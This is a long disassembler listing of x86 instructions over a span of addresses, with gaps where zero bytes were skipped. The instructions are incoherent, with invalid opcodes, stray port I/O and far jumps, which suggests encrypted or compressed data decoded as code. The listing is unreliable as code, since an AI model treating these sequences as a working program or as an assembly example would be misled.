  4221ee:	int    0xe1
  4221f0:	stc    
  4221f1:	cmp    DWORD PTR [edx],0x67
  4221f4:	jle    0x42224e
  4221f6:	pop    edi
  4221f7:	push   ebx
  4221f8:	enter  0x8eeb,0x38
  4221fc:	loope  0x4221c8
  4221fe:	mov    eax,0xff4b1248
  422203:	or     DWORD PTR [ecx-0x78],edi
  422206:	out    0xce,al
  422208:	jmp    0x42218a
  42220a:	jno    0x42224a
  42220c:	arpl   WORD PTR [eax+0x6f91beed],dx
  422212:	fnstcw WORD PTR [esi]
  422214:	mov    ah,0x41
  422216:	aas    
  422217:	or     al,0xa9
  422219:	cmp    al,0xb0
  42221b:	stos   BYTE PTR es:[edi],al
  42221c:	pushf  
  42221d:	cmp    al,0xea
  42221f:	inc    DWORD PTR [eax]
  422221:	push   ebp
  422222:	fistp  WORD PTR [ecx+0x1b49acef]
  422228:	mov    ah,0xbd
  42222a:	stc    
  42222b:	aas    
  42222c:	jbe    0x422255
  42222e:	shl    BYTE PTR [eax-0x460914c5],0x37
  422235:	dec    ebx
  422236:	add    BYTE PTR [edx-0x598bacd9],al
  42223c:	pop    ss
  42223d:	das    
  42223e:	sbb    esp,ebp
  422240:	inc    esi
  422241:	add    al,0x65
  422243:	mov    bl,0x5e
  422245:	jne    0x4221d0
  422247:	jno    0x42229e
  422249:	push   ebx
  42224a:	or     BYTE PTR [esi+0x3c],cl
  42224d:	fidivr DWORD PTR [ecx]
  42224f:	mov    al,ds:0xee7bf1c6
  422254:	inc    ebx
  422255:	lea    ebp,ds:0x56bddcc9
  42225b:	sti    
  42225c:	add    eax,DWORD PTR [ecx]
  42225e:	cld    
  42225f:	adc    BYTE PTR [ecx-0x792e754d],al
  422265:	xor    eax,DWORD PTR ds:0x337e31a
  42226b:	and    BYTE PTR [eax+0xb],ch
  42226e:	dec    edi
  42226f:	mov    ah,0x62
  422271:	pop    ebx
  422272:	(bad)  
  422274:	shr    ah,0xab
  422277:	jl     0x4222f0
  422279:	shl    DWORD PTR [edi],0xc4
  42227c:	or     BYTE PTR [esi],0x3c
  42227f:	jmp    0x4222ab
  422281:	sub    al,0xc8
  422283:	add    DWORD PTR [ebp-0x47],ebx
  422286:	test   BYTE PTR [eax+ebx*4+0x13173834],0xb6
  42228e:	cmc    
  42228f:	xchg   ebp,eax
  422290:	cmp    eax,0x7b0b7873
  422295:	mov    edx,0xf62e513a
  42229a:	pusha  
  42229b:	xor    ebp,edx
  42229d:	ret    0xdd7f
  4222a0:	jmp    0x422257
  4222a2:	mov    cl,0xde
  4222a4:	in     eax,0xd2
  4222a6:	loope  0x422311
  4222a8:	and    al,0xab
  4222aa:	inc    ebp
  4222ab:	(bad)  
  4222ac:	mov    DWORD PTR [edx-0x1d],esi
  4222af:	int    0x84
  4222b1:	mov    dl,BYTE PTR [edi+0x18]
  4222b4:	or     al,0x15
  4222b6:	dec    ebx
  4222b7:	dec    esi
  4222b8:	inc    ebp
  4222b9:	and    edi,eax
  4222bb:	xor    edx,eax
  4222bd:	ja     0x4222e2
  4222bf:	in     al,0xc8
	...
  422331:	add    BYTE PTR [eax],al
  422333:	add    dh,bh
  422335:	(bad)  
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	stos   BYTE PTR es:[edi],al
  422341:	and    al,0x93
  422343:	outs   dx,BYTE PTR ds:[esi]
  422344:	jb     0x4223b3
  422346:	add    DWORD PTR [eax],eax
  422348:	cmc    
  422349:	add    BYTE PTR [eax],al
  42234b:	add    BYTE PTR [ebx-0x7d42ce19],bl
  422351:	mov    bl,0xf7
  422353:	mov    WORD PTR [edi+edx*1-0x1c],fs
  422357:	push   edi
  422358:	xlat   BYTE PTR ds:[ebx]
  422359:	cmp    DWORD PTR [esi-0x38],ebx
  42235c:	xor    DWORD PTR [ebp+0x648b0533],edx
  422362:	sbb    al,0x2a
  422364:	push   0xfffffff6
  422366:	jno    0x42237b
  422368:	sbb    al,0xc8
  42236a:	or     bh,al
  42236c:	popf   
  42236d:	outs   dx,BYTE PTR ds:[esi]
  42236e:	pusha  
  42236f:	cmp    edx,DWORD PTR [esi+edx*1+0x6399967]
  422376:	imul   esi,edx,0x9f2393ce
  42237c:	xchg   bh,bh
  42237e:	mov    dl,0xf4
  422380:	adc    al,0x2e
  422382:	loop   0x422352
  422384:	repnz loope 0x422322
  422387:	ficom  WORD PTR [ebp+esi*4+0x79]
  42238b:	not    DWORD PTR [edx+0x25848489]
  422391:	(bad)  
  422392:	out    0x43,al
  422394:	test   eax,0xd701593f
  422399:	hlt    
  42239a:	add    edx,DWORD PTR [esi]
  42239c:	scas   al,BYTE PTR es:[edi]
  42239d:	adc    eax,0x467da05b
  4223a2:	dec    edx
  4223a3:	test   DWORD PTR [ebp+0x15],ecx
  4223a6:	cli    
  4223a7:	push   ecx
  4223a8:	mov    esi,0xaa1901a8
  4223ad:	dec    ebx
  4223ae:	mov    al,0x98
  4223b0:	xchg   ebx,eax
  4223b1:	lahf   
  4223b2:	cmp    cl,0xf5
  4223b5:	hlt    
  4223b6:	jmp    0xccd8:0x2d69194a
  4223bd:	xor    al,0x73
  4223bf:	xchg   ebp,eax
  4223c0:	out    dx,al
  4223c1:	jnp    0x4223d7
  4223c3:	mov    ecx,0xc0f2d8ec
  4223c8:	inc    edi
  4223c9:	sub    al,0xa5
  4223cb:	and    DWORD PTR [ebx-0x47],0xfffffff4
  4223cf:	bound  ecx,QWORD PTR [ebp-0x2e89ec4f]
  4223d5:	xchg   edx,eax
  4223d6:	push   0xcc677c0d
  4223db:	dec    esp
  4223dc:	sub    DWORD PTR [eax+0x4358cc45],esi
  4223e2:	inc    eax
  4223e3:	dec    ebp
  4223e4:	ret    
  4223e5:	push   esp
  4223e6:	(bad)  
  4223e8:	mov    WORD PTR [ebx],?
  4223ea:	scas   al,BYTE PTR es:[edi]
  4223eb:	push   0xb6411664
  4223f0:	std    
  4223f1:	test   eax,0x7b9a676e
  4223f6:	dec    ebx
  4223f7:	mov    edi,0xc4ddef5a
  4223fc:	loope  0x4223c0
  4223fe:	dec    ecx
  4223ff:	mov    al,0xa0
  422401:	adc    DWORD PTR [ebx+ebp*2+0x16],esp
  422405:	dec    ecx
  422406:	jb     0x422440
  422408:	xchg   BYTE PTR [ebp+0x2d],bh
  42240b:	ret    
  42240c:	mul    BYTE PTR [eax-0x24]
  42240f:	xor    BYTE PTR [ecx+edx*4],0x2
  422413:	xor    al,BYTE PTR [ecx]
  422415:	les    edi,FWORD PTR ds:0x3ac1a1e7
  42241b:	out    dx,al
  42241c:	fist   WORD PTR es:[esi-0x10]
  422420:	std    
  422421:	sbb    eax,0x8cba0cfc
  422427:	cmp    eax,0xa78a27ee
  42242c:	adc    ebp,DWORD PTR ss:[ebp-0x33a60199]
  422433:	dec    ebp
  422434:	out    0x13,al
  422436:	add    eax,edx
  422438:	sbb    eax,0xd3e69c7d
  42243d:	sti    
  42243e:	aaa    
  42243f:	adc    DWORD PTR [edi],eax
	...
  4224b1:	add    BYTE PTR [eax],al
  4224b3:	add    dh,dl
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0x27ec9f7c
  4224c2:	call   0xf500:0x16e6749
  4224c9:	add    BYTE PTR [eax],al
  4224cb:	add    al,bl
  4224cd:	jae    0x422485
  4224cf:	cmp    eax,0x1b131ac3
  4224d4:	lea    edx,[esp+ebx*2]
  4224d7:	in     al,dx
  4224d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224d9:	and    ch,dh
  4224db:	mov    ah,0x9
  4224dd:	push   esi
  4224de:	fimul  WORD PTR [esi]
  4224e0:	adc    eax,0x9bf1d377
  4224e5:	mov    ss,WORD PTR ds:0x6c5a666d
  4224eb:	mov    esp,0xb613bcfb
  4224f0:	pop    edi
  4224f1:	jns    0x42252b
  4224f3:	fist   WORD PTR [edi-0x4ba909a2]
  4224f9:	stos   DWORD PTR es:[edi],eax
  4224fa:	cmc    
  4224fb:	lock arpl WORD PTR [edi],sp
  4224fe:	cld    
  4224ff:	fdivr  st(5),st
  422501:	mov    DWORD PTR [ebp+0x66],esp
  422504:	cmp    ecx,edi
  422506:	stos   DWORD PTR es:[edi],eax
  422507:	lods   eax,DWORD PTR ds:[esi]
  422508:	add    al,0xf1
  42250a:	out    0x24,al
  42250c:	add    BYTE PTR [eax-0xd],bh
  42250f:	fwait
  422510:	mov    esp,0xdf87302f
  422515:	and    eax,0x3b8f43e4
  42251a:	sub    bh,al
  42251c:	mov    ah,0x73
  42251e:	jne    0x4224c5
  422520:	adc    bh,ch
  422522:	or     BYTE PTR ss:[esi],ah
  422525:	add    eax,0x54b9e887
  42252a:	xor    cl,BYTE PTR ds:0x9658e2a5
  422530:	xlat   BYTE PTR ds:[ebx]
  422531:	push   ecx
  422532:	cmp    BYTE PTR [ebx-0x56],ch
  422535:	hlt    
  422536:	inc    eax
  422537:	call   0x7bc7:0x6f4f1af7
  42253e:	sub    eax,0xb989355f
  422543:	xor    esp,DWORD PTR [eax+0x532902a1]
  422549:	mov    ds:0xfecc28de,eax
  42254e:	rol    edx,0xea
  422551:	inc    ebx
  422552:	sub    eax,esp
  422554:	or     esi,0xffffffb5
  422557:	or     BYTE PTR [ebx-0x7c],bh
  42255a:	rcr    BYTE PTR [eax+0x16],0x62
  42255e:	jbe    0x422506
  422560:	push   ebp
  422561:	imul   ebx,ecx,0xffffffdc
  422564:	jecxz  0x422560
  422566:	xlat   BYTE PTR ds:[ebx]
  422567:	js     0x4225ba
  422569:	popf   
  42256a:	or     al,0x68
  42256c:	pop    ebx
  42256d:	and    al,0x26
  42256f:	or     ebx,edi
  422571:	retf   
  422572:	daa    
  422573:	lock stos BYTE PTR es:[edi],al
  422575:	daa    
  422576:	sub    DWORD PTR [eax],ebp
  422578:	pop    edx
  422579:	pop    ebp
  42257a:	cdq    
  42257b:	push   ebx
  42257c:	cmp    edx,eax
  42257e:	mov    WORD PTR [ebx],cs
  422580:	inc    ebp
  422581:	pusha  
  422582:	xchg   eax,ebp
  422584:	test   al,0xa4
  422586:	add    eax,DWORD PTR [ebp-0x68156ba]
  42258c:	(bad)  
  42258d:	(bad)  
  42258e:	adc    al,0xd
  422590:	jecxz  0x42257f
  422592:	add    eax,0x6e27a531
  422597:	push   ds
  422598:	in     eax,dx
  422599:	push   edx
  42259a:	sub    esp,DWORD PTR [ebx+0x35]
  42259d:	les    edx,FWORD PTR [eax+0x18]
  4225a0:	sbb    al,0xd1
  4225a2:	(bad)  
  4225a3:	scas   eax,DWORD PTR es:[edi]
  4225a4:	mov    cl,0x8e
  4225a6:	leave  
  4225a7:	push   ss
  4225a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a9:	cmp    ecx,DWORD PTR [edx]
  4225ab:	scas   al,BYTE PTR es:[edi]
  4225ac:	dec    esp
  4225ad:	push   es
  4225ae:	scas   al,BYTE PTR es:[edi]
  4225af:	cli    
  4225b0:	(bad)  
  4225b1:	dec    esi
  4225b2:	or     al,BYTE PTR [esi+0x53]
  4225b5:	jns    0x42258e
  4225b7:	pusha  
  4225b8:	xchg   ecx,eax
  4225b9:	inc    edx
  4225ba:	iret   
  4225bb:	xor    DWORD PTR [edi],edx
  4225bd:	sbb    edi,ecx
  4225bf:	sbb    ch,BYTE PTR [esi]
	...
  422631:	add    BYTE PTR [eax],al
  422633:	add    BYTE PTR [ebx-0x105512d4],ch
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	xlat   BYTE PTR ds:[ebx]
  422641:	int3   
  422642:	inc    eax
  422643:	ins    BYTE PTR es:[edi],dx
  422644:	pop    esp
  422645:	outs   dx,DWORD PTR ds:[esi]
  422646:	add    DWORD PTR [eax],eax
  422648:	cmc    
  422649:	add    BYTE PTR [eax],al
  42264b:	add    cl,ch
  42264d:	jecxz  0x4226c4
  42264f:	cmc    
  422650:	loopne 0x42260c
  422652:	xor    dh,BYTE PTR [ecx+ecx*4-0x7d]
  422656:	sbb    edx,DWORD PTR [ebx]
  422658:	adc    al,0xe4
  42265a:	mov    gs,WORD PTR [ebx-0x37]
  42265d:	lds    esp,FWORD PTR [edi]
  42265f:	rcl    DWORD PTR [ebx+0x47039c9],0xa2
  422666:	sbb    eax,0x22b8d667
  42266b:	or     BYTE PTR [ebp-0x5a],0x99
  42266f:	mov    dh,0xcd
  422671:	xchg   edi,eax
  422672:	mov    gs,WORD PTR [esi]
  422674:	push   esp
  422675:	into   
  422676:	shrd   DWORD PTR [esi+0x66],esp,0x52
  42267b:	scas   al,BYTE PTR es:[edi]
  42267c:	in     al,0xf2
  42267e:	mov    al,0x9
  422680:	xchg   esi,eax
  422681:	and    DWORD PTR [esi+0x366df222],0xcd9b88f3
  42268b:	(bad)  
  42268c:	pop    esi
  42268d:	adc    DWORD PTR [eax],edx
  42268f:	clc    
  422690:	lods   eax,DWORD PTR ds:[esi]
  422691:	aas    
  422692:	out    0xa,eax
  422694:	ja     0x422671
  422696:	retf   0x5327
  422699:	shl    BYTE PTR [ebp-0xca0fdc1],1
  42269f:	xchg   edi,eax
  4226a0:	mov    BYTE PTR [ecx+esi*2],al
  4226a3:	jb     0x42265d
  4226a5:	in     al,dx
  4226a6:	ror    DWORD PTR [edx-0x13],0x17
  4226aa:	jl     0x4226f4
  4226ac:	lds    ecx,FWORD PTR [ebx]
  4226ae:	and    DWORD PTR [esi],ecx
  4226b0:	iret   
  4226b1:	(bad)  
  4226b2:	cs int 0x80
  4226b5:	add    dh,dl
  4226b7:	jmp    0xfd0e:0xff9361e4
  4226be:	stos   DWORD PTR es:[edi],eax
  4226bf:	and    ch,BYTE PTR [ebx-0x19]
  4226c2:	xor    BYTE PTR gs:[edx+ebp*8],dl
  4226c6:	jle    0x42265e
  4226c8:	mov    al,BYTE PTR [ebx-0x42]
  4226cb:	pushf  
  4226cc:	fnstenv [esi-0x539ebcf7]
  4226d2:	stos   BYTE PTR es:[edi],al
  4226d3:	pop    ss
  4226d4:	and    al,BYTE PTR [ecx+0x7cbd73b3]
  4226da:	add    bl,ch
  4226dc:	loopne 0x4226b1
  4226de:	cs pop ebp
  4226e0:	xor    ecx,DWORD PTR [ecx]
  4226e2:	sti    
  4226e3:	lods   eax,DWORD PTR ds:[esi]
  4226e4:	into   
  4226e5:	dec    esp
  4226e6:	inc    edx
  4226e7:	cli    
  4226e8:	xchg   ebx,edi
  4226ea:	repz mov ah,bl
  4226ed:	pop    edx
  4226ee:	or     dh,bh
  4226f0:	xchg   esp,eax
  4226f1:	pop    ebp
  4226f2:	mov    ds:0x41ece461,eax
  4226f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226f8:	je     0x4226d4
  4226fa:	mov    ebp,0x6d6c1463
  4226ff:	ret    0x626
  422702:	loope  0x422729
  422704:	cmp    DWORD PTR [edi-0x57],edx
  422707:	nop
  422708:	in     al,dx
  422709:	das    
  42270a:	mov    esp,0x700835ba
  42270f:	js     0x4226b5
  422711:	(bad)  
  422712:	mov    ecx,0xf0f52082
  422717:	shl    BYTE PTR [ecx],cl
  422719:	mov    bh,BYTE PTR [ebx+esi*8]
  42271c:	dec    esp
  42271d:	adc    DWORD PTR [edi-0x66],ecx
  422720:	and    al,dl
  422722:	push   cs
  422723:	pop    ebx
  422724:	pop    ebx
  422725:	(bad)  
  422726:	push   esp
  422727:	xor    eax,0x8e0dceba
  42272c:	jb     0x422741
  42272e:	cmp    edx,0xfffffff7
  422731:	jnp    0x4226fa
  422733:	js     0x42275d
  422735:	and    ebx,DWORD PTR [esi-0x56]
  422738:	mov    edi,0xcddf7cde
  42273d:	adc    al,0xa5
  42273f:	inc    ebx
  422740:	imul   eax,DWORD PTR [eax],0x0
	...
  4227b3:	add    cl,dl
  4227b5:	mov    al,ds:0xf9f9e0b9
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	xchg   ecx,eax
  4227c1:	and    BYTE PTR [ebp-0x42],cl
  4227c4:	push   ecx
  4227c5:	jo     0x4227c8
  4227c7:	add    ch,dh
  4227c9:	add    BYTE PTR [eax],al
  4227cb:	add    BYTE PTR [ebx],cl
  4227cd:	and    DWORD PTR [esi+0x6ff9f225],ecx
  4227d3:	pop    ss
  4227d4:	sbb    eax,0x7fb1a9e5
  4227d9:	loopne 0x4227b6
  4227db:	sub    al,0x22
  4227dd:	mov    DWORD PTR [ecx],edx
  4227df:	fld    TBYTE PTR cs:[ebp+0x2d]
  4227e3:	jle    0x422844
  4227e5:	sbb    esp,DWORD PTR [edx-0x56]
  4227e8:	je     0x422852
  4227ea:	lea    esi,[ebx-0x38]
  4227ed:	mov    al,ds:0x471403a9
  4227f2:	aas    
  4227f3:	and    ebx,ebp
  4227f5:	jp     0x42279c
  4227f7:	(bad)  
  4227f8:	xchg   BYTE PTR [eax],cl
  4227fa:	xor    cl,BYTE PTR [ebp-0x37]
  4227fd:	push   es
  4227fe:	xchg   edx,eax
  4227ff:	push   ebx
  422800:	and    BYTE PTR [eax+0x7f],bl
  422803:	outs   dx,DWORD PTR ds:[esi]
  422804:	ins    BYTE PTR es:[edi],dx
  422805:	push   ebp
  422806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422807:	rcl    DWORD PTR ds:0xc9961524,0xa
  42280e:	cli    
  42280f:	fs jl  0x4227f0
  422812:	mov    dl,0xee
  422814:	push   ecx
  422815:	sbb    DWORD PTR [ebx+esi*4],edi
  422818:	test   BYTE PTR [eax+0x14],bh
  42281b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42281c:	in     al,0xfa
  42281e:	shl    BYTE PTR [eax],cl
  422820:	jnp    0x422851
  422822:	pushf  
  422823:	aad    0xa4
  422825:	pushf  
  422826:	inc    eax
  422827:	jno    0x4227f7
  422829:	adc    dh,0xfe
  42282c:	cmp    eax,0x63da622
  422831:	outs   dx,DWORD PTR ds:[esi]
  422832:	sub    eax,0x7e404b15
  422837:	ror    ebp,0x58
  42283a:	aas    
  42283b:	inc    esi
  42283c:	jl     0x422813
  42283e:	pop    ds
  42283f:	sbb    dh,BYTE PTR [esi-0x4bf5e10d]
  422845:	pop    esi
  422846:	or     esi,DWORD PTR [edx+0x4e]
  422849:	(bad)
  42284d:	dec    ebx
  42284e:	sbb    BYTE PTR [edx+0x55],ch
  422851:	mov    eax,ds:0xdd21d645
  422856:	add    ch,BYTE PTR [edi+edx*2]
  422859:	or     al,0x43
  42285b:	fs pop ebp
  42285d:	lock lds esp,FWORD PTR cs:[eax+eax*8-0x32]
  422863:	(bad)  
  422865:	ins    DWORD PTR es:[edi],dx
  422866:	pop    edi
  422867:	add    dl,bh
  422869:	inc    edx
  42286a:	inc    ebx
  42286b:	and    al,0x66
  42286d:	pop    edx
  42286e:	dec    ebp
  42286f:	jmp    0xae747576
  422874:	lods   al,BYTE PTR ds:[esi]
  422875:	sti    
  422876:	mov    ch,0x34
  422878:	cs es add eax,esp
  42287c:	sbb    al,0x5f
  42287e:	inc    ecx
  42287f:	clc    
  422880:	stos   BYTE PTR es:[edi],al
  422881:	add    al,0x52
  422883:	cmp    al,0x15
  422885:	outs   dx,DWORD PTR ds:[esi]
  422886:	int3   
  422887:	pop    ebx
  422888:	add    BYTE PTR [edi-0x24],0xe0
  42288c:	mov    cl,0xdd
  42288e:	pop    ebx
  42288f:	pop    es
  422890:	cwde   
  422891:	jp     0x42286b
  422893:	push   edi
  422894:	out    0x8b,al
  422896:	popa   
  422897:	or     BYTE PTR [esi+0x6f817611],bl
  42289d:	dec    ecx
  42289e:	loop   0x422880
  4228a0:	(bad)
  4228a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228a4:	aaa    
  4228a5:	xlat   BYTE PTR ds:[ebx]
  4228a6:	and    dl,BYTE PTR ds:0xf105f521
  4228ac:	push   ebx
  4228ad:	xchg   ebp,eax
  4228ae:	xchg   DWORD PTR [ebp+0x19],esp
  4228b1:	sub    BYTE PTR [eax+ecx*4+0x175853a8],cl
  4228b8:	(bad)  
  4228b9:	cwde   
  4228ba:	sbb    cl,BYTE PTR [esi+0x41]
  4228bd:	cmp    al,0x82
  4228bf:	pop    eax
  4228c0:	cld    
	...
  422931:	add    BYTE PTR [eax],al
  422933:	add    dh,bh
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	jl     0x422927
  422942:	hlt    
  422943:	fiadd  DWORD PTR [esi+0x71]
  422946:	add    DWORD PTR [eax],eax
  422948:	cmc    
  422949:	add    BYTE PTR [eax],al
  42294b:	add    dh,bl
  42294d:	shl    DWORD PTR [esi-0x1a12a763],1
  422953:	cdq    
  422954:	fs mov ebx,0x6919a4
  42295a:	inc    esi
  42295b:	xchg   BYTE PTR [edi],dh
  42295d:	sbb    edx,ebp
  42295f:	jp     0x42295d
  422961:	mov    bh,0x72
  422963:	mov    dl,0x1d
  422965:	sbb    ecx,DWORD PTR [si-0x64]
  422969:	out    dx,al
  42296a:	in     eax,dx
  42296b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42296c:	xchg   ecx,eax
  42296d:	test   eax,0x580d1f7e
  422972:	mov    DWORD PTR [edi],ebp
  422974:	mov    ebx,ecx
  422976:	ins    BYTE PTR es:[edi],dx
  422977:	cmp    al,0x7e
  422979:	test   eax,0x1afbef28
  42297e:	imul   edx,DWORD PTR [eax+0x45d5ef31],0xffffffd2
  422985:	or     BYTE PTR [ebx-0x58],ah
  422988:	sub    edi,ebx
  42298a:	mov    dh,0xaf
  42298c:	dec    esi
  42298d:	cmp    BYTE PTR [ebp+esi*8+0x36],bh
  422991:	jne    0x4229c6
  422993:	pop    ecx
  422994:	rcr    BYTE PTR [ebp+0x2e],0xa4
  422998:	ret    
  422999:	daa    
  42299a:	jno    0x4229c1
  42299c:	mov    edx,DWORD PTR [edi-0x74]
  42299f:	pop    ebx
  4229a0:	stc    
  4229a1:	std    
  4229a2:	clc    
  4229a3:	fimul  WORD PTR [ebp+0x3]
  4229a6:	enter  0xd8b6,0x86
  4229aa:	jbe    0x4229b4
  4229ac:	mov    edi,0xacbb9e0c
  4229b1:	imul   ebx,DWORD PTR [ebx+0x4f],0x48
  4229b5:	jp     0x4229b2
  4229b7:	scas   eax,DWORD PTR es:[edi]
  4229b8:	add    al,0x63
  4229ba:	pop    ds
  4229bb:	push   0xc8c31da1
  4229c0:	dec    esp
  4229c1:	mov    ebp,0x697bce53
  4229c6:	add    bh,0x49
  4229c9:	mov    al,cl
  4229cb:	sub    edi,DWORD PTR [edi+0x35]
  4229ce:	sbb    eax,0x8b7cc39c
  4229d3:	sub    DWORD PTR [ecx],eax
  4229d5:	sub    ebx,ebx
  4229d7:	repz xor al,0x32
  4229da:	pop    ebp
  4229db:	mov    ebx,esp
  4229dd:	cmc    
  4229de:	(bad)  
  4229df:	mov    ebx,0xd7e57c73
  4229e4:	and    dh,BYTE PTR [esp+edx*1-0x61c10a6b]
  4229eb:	jnp    0x4229b2
  4229ed:	dec    edx
  4229ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229ef:	inc    esp
  4229f0:	xor    al,ch
  4229f2:	ss enter 0x6987,0x27
  4229f7:	test   al,0x40
  4229f9:	sub    eax,0x5eb95c5c
  4229fe:	sbb    bh,ch
  422a00:	push   es
  422a01:	cmp    DWORD PTR [edi-0x5f],ebp
  422a04:	aas    
  422a05:	dec    eax
  422a06:	lods   al,BYTE PTR ds:[esi]
  422a07:	sbb    bl,dl
  422a09:	inc    edx
  422a0a:	loop   0x422a40
  422a0c:	xchg   ecx,eax
  422a0d:	ds mov eax,0xb4f96081
  422a13:	loop   0x4229b7
  422a15:	rcl    ecx,1
  422a17:	or     edi,DWORD PTR es:[edi-0x7]
  422a1b:	mov    ah,0xb4
  422a1d:	lods   eax,DWORD PTR ds:[esi]
  422a1e:	cli    
  422a1f:	and    al,0x89
  422a21:	and    DWORD PTR [esi+0x63],edx
  422a24:	xor    esi,0x6d
  422a27:	ret    
  422a28:	dec    esp
  422a29:	xor    dh,BYTE PTR [edx-0x5c]
  422a2c:	dec    eax
  422a2d:	fwait
  422a2e:	mov    dl,dh
  422a30:	rol    DWORD PTR [edx-0x2d203b4d],1
  422a36:	leave  
  422a37:	pop    ebx
  422a38:	xchg   DWORD PTR [eax],ebp
  422a3a:	mov    BYTE PTR [ebp+0x4d],bl
  422a3d:	pop    ss
  422a3e:	push   ebx
  422a3f:	inc    ebx
  422a40:	pop    DWORD PTR [eax]
	...
  422ab2:	add    BYTE PTR [eax],al
  422ab4:	push   ss
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	fs (bad) 
  422ac2:	cwde   
  422ac3:	mov    bh,0x3b
  422ac5:	jb     0x422ac8
  422ac7:	add    ch,dh
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    BYTE PTR [ebp+0x1f],al
  422ace:	hlt    
  422acf:	jle    0x422ab5
  422ad1:	xchg   ebp,eax
  422ad2:	jns    0x422af1
  422ad4:	pop    ecx
  422ad5:	dec    ebp
  422ad6:	add    DWORD PTR [eax-0x5c287093],edx
  422adc:	ins    BYTE PTR es:[edi],dx
  422add:	sbb    cl,bh
  422adf:	int    0x2b
  422ae1:	jmp    0x422aee
  422ae3:	iret   
  422ae4:	jno    0x422b50
  422ae6:	jbe    0x422b3b
  422ae8:	iret   
  422ae9:	adc    edx,ebx
  422aeb:	imul   ebp
  422aed:	addr16 xchg edx,eax
  422aef:	inc    edx
  422af0:	daa    
  422af1:	aad    0x2e
  422af3:	mov    DWORD PTR [esi+0x70],eax
  422af6:	jnp    0x422aed
  422af8:	add    ebx,DWORD PTR [edx+0xa]
  422afb:	data16 loope 0x422b52
  422afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422aff:	inc    edi
  422b00:	mov    ch,0x89
  422b02:	ins    DWORD PTR es:[edi],dx
  422b03:	jp     0x422ab7
  422b05:	xchg   esp,eax
  422b06:	pop    ds
  422b07:	aaa    
  422b08:	dec    ebx
  422b09:	push   0xffffffba
  422b0b:	mov    ch,0x96
  422b0d:	pop    ebp
  422b0e:	out    dx,al
  422b0f:	add    eax,0x610dddb4
  422b14:	test   al,0x46
  422b16:	mov    ds:0x90ab446c,al
  422b1b:	int3   
  422b1c:	inc    eax
  422b1d:	jnp    0x422b67
  422b1f:	and    al,0x25
  422b21:	stos   DWORD PTR es:[edi],eax
  422b22:	mov    bl,0xf8
  422b24:	jne    0x422acd
  422b26:	std    
  422b27:	je     0x422b1f
  422b29:	sahf   
  422b2a:	dec    edi
  422b2b:	mov    eax,ds:0x611225a0
  422b30:	push   edx
  422b31:	inc    ecx
  422b32:	jno    0x422abc
  422b34:	cmp    DWORD PTR [ebp-0x29fd38cd],esp
  422b3a:	push   ss
  422b3b:	fistp  WORD PTR [esi-0x622fd755]
  422b41:	and    bh,bh
  422b43:	adc    al,0x71
  422b45:	adc    al,0x4b
  422b47:	and    al,0x39
  422b49:	ficom  DWORD PTR [esi-0x2]
  422b4c:	adc    BYTE PTR [edx],0x92
  422b4f:	xor    DWORD PTR [edi-0x47],0x7a3f13fc
  422b56:	pusha  
  422b57:	mov    ds:0x9583bfa9,al
  422b5c:	cld    
  422b5d:	outs   dx,DWORD PTR ds:[esi]
  422b5e:	sub    al,0x4e
  422b60:	(bad)  
  422b61:	sub    BYTE PTR [esi],bh
  422b63:	cmp    edx,ebx
  422b65:	mov    al,0x47
  422b67:	mov    ds:0xfd9db5e2,eax
  422b6c:	push   eax
  422b6d:	cmp    BYTE PTR [esi+0x12],ch
  422b70:	sub    al,0xf2
  422b72:	lock mov esi,0x2bbeab56
  422b78:	inc    eax
  422b79:	push   esi
  422b7a:	adc    ecx,DWORD PTR [ecx+0x48b04525]
  422b80:	dec    eax
  422b81:	xor    eax,0x45902644
  422b86:	push   ss
  422b87:	inc    ecx
  422b88:	push   0xb971a2a2
  422b8d:	jle    0x422be4
  422b8f:	xchg   ebp,eax
  422b90:	fsubr  QWORD PTR [esi+0x1cd1c256]
  422b96:	inc    eax
  422b97:	in     al,dx
  422b98:	pop    ebx
  422b99:	popf   
  422b9a:	shl    dl,0xf
  422b9d:	sahf   
  422b9e:	ficom  DWORD PTR [ebx+0x623aadd3]
  422ba4:	jle    0x422b80
  422ba6:	xlat   BYTE PTR ds:[ebx]
  422ba7:	lahf   
  422ba8:	fnstsw WORD PTR [eax+0x1d893b6d]
  422bae:	xchg   ebx,eax
  422baf:	in     al,dx
  422bb0:	aam    0x47
  422bb2:	adc    DWORD PTR [ebx],ebx
  422bb4:	jno    0x422bac
  422bb6:	jo     0x422bc0
  422bb8:	cmp    eax,0xbfc0f81f
  422bbd:	adc    eax,0x770e73
	...
  422c32:	add    BYTE PTR [eax],al
  422c34:	mov    al,0x6b
  422c36:	mov    ch,0xe5
  422c38:	(bad)  
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	ret    0xe171
  422c43:	shl    BYTE PTR [eax],1
  422c45:	jae    0x422c48
  422c47:	add    ch,dh
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    BYTE PTR [ebp-0x1f],cl
  422c4e:	icebp  
  422c4f:	sahf   
  422c50:	and    bh,dh
